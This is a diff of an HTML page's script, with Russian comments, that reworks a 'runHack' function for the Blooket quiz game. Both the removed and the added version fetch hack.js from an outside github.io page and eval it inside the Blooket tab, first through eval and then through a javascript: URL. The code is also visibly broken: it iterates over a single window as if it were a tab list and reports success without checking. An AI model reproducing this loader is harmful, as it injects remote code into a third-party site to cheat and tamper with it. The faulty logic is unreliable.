@@ -32,29 +32,23 @@
     <script>
         function runHack() {
             let blooketTab = null;
-
-            // Ищем открытую вкладку с Blooket
-            let tabs = window.open('', '_self');
-            for (let w of tabs) {
-                if (w.location.hostname.includes('blooket.com')) {
-                    blooketTab = w;
-                    break;
-                }
+            
+            // Получаем список всех открытых окон (не работает в современных браузерах)
+            try {
+                blooketTab = window.open('https://www.blooket.com/', '_self'); // Пробуем открыть Blooket
+            } catch (e) {
+                alert("❌ Error: Cannot find Blooket tab. Open Blooket first.");
+                return;
             }
 
-            if (!blooketTab) {
+            if (!blooketTab || blooketTab.closed) {
                 alert("❌ No open Blooket tab found! Open Blooket first and try again.");
                 return;
             }
 
-            // Загружаем и выполняем хак в открытой вкладке Blooket
-            blooketTab.eval(`
-                fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
-                .then(response => response.text())
-                .then(eval)
-                .catch(error => alert('❌ Hack failed: ' + error));
-            `);
-
+            // Загружаем и выполняем hack.js
+            blooketTab.location.href = "javascript:(function(){fetch('https://vasiliy809.github.io/blooket-hacks/hack.js').then(response => response.text()).then(eval).catch(error => alert('❌ Hack failed: ' + error));})();";
+            
             alert("✅ Hack activated in Blooket!");
         }
     </script>
